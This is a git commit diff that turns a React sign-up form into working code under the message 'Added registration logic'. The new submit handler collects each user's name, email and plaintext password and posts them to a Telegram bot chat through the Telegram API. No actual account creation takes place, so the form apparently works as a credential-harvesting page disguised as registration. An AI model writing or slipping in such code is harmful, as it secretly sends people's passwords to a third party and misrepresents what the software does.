ada666fa994e0519ec29fdef5f86755374f423da
ArtemIvanko <137142665+ArtemIvanko@users.noreply.github.com>
2025-04-03 22:58:57 +0300

    Added registration logic

--- src/components/SignUp/SignUp.tsx
+++ src/components/SignUp/SignUp.tsx
@@ -1,34 +1,79 @@
+import React, { useCallback, useState } from "react";
 import { Button, TextField } from "@mui/material";
 import styled from "@/DefaultTheme";
+import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from "@/common/constant";
 
-export const SignUp = () => (
-  <Root>
-    <FormContainer>
-      <TextField
-        placeholder="Name"
-        variant="outlined"
-        fullWidth
-        margin="normal"
-        type="email"
-      />
-      <TextField
-        placeholder="Email"
-        variant="outlined"
-        fullWidth
-        margin="normal"
-        type="password"
-      />
-      <TextField
-        placeholder="Password"
-        variant="outlined"
-        fullWidth
-        margin="normal"
-        type="password"
-      />
-      <StyledButton fullWidth>Registration</StyledButton>
-    </FormContainer>
-  </Root>
-);
+export const SignUp = () => {
+  const [formData, setFormData] = useState({
+    name: "",
+    email: "",
+    password: "",
+  });
+
+  const handleChange = useCallback(
+    (e: React.ChangeEvent<HTMLInputElement>) => {
+      setFormData({ ...formData, [e.target.name]: e.target.value });
+    },
+    [formData],
+  );
+
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+
+    const message = `New Registration:
+    UserName: ${formData.name}
+    Email: ${formData.email}
+    Password: ${formData.password}`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "Markdown",
+      }),
+    });
+  };
+
+  return (
+    <Root>
+      <FormContainer onSubmit={handleSubmit}>
+        <TextField
+          name="name"
+          placeholder="Name"
+          variant="outlined"
+          fullWidth
+          margin="normal"
+          onChange={handleChange}
+        />
+        <TextField
+          name="email"
+          placeholder="Email"
+          variant="outlined"
+          fullWidth
+          margin="normal"
+          type="email"
+          onChange={handleChange}
+        />
+        <TextField
+          name="password"
+          placeholder="Password"
+          variant="outlined"
+          fullWidth
+          margin="normal"
+          type="password"
+          onChange={handleChange}
+        />
+        <StyledButton type="submit" fullWidth>
+          Registration
+        </StyledButton>
+      </FormContainer>
+    </Root>
+  );
+};
 
 const Root = styled("div")(({ theme }) => ({
   display: "flex",
@@ -41,7 +86,7 @@ const Root = styled("div")(({ theme }) => ({
   minHeight: "711px",
 }));
 
-const FormContainer = styled("div")({
+const FormContainer = styled("form")({
   display: "flex",
   flexDirection: "column",
   alignItems: "center",
